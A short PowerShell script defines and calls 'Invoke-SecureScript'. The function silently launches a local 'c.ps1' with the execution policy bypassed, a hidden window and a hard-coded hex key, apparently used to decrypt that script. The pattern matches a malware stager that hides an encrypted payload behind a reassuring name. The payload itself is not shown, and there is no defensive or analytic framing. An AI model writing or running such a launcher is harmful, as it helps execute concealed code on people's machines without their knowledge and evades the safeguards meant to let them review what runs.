function Invoke-SecureScript {
    $pass = "15ff0b2f2b9ee5bc7ab375c40bc2d4996bf768aeb8a2c55bac214ba261ec7f32"

    $scriptPath = Join-Path -Path (Get-Location) -ChildPath 'c.ps1'

    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`" -d `"$pass`"" -WindowStyle Hidden -Wait
}

Invoke-SecureScript
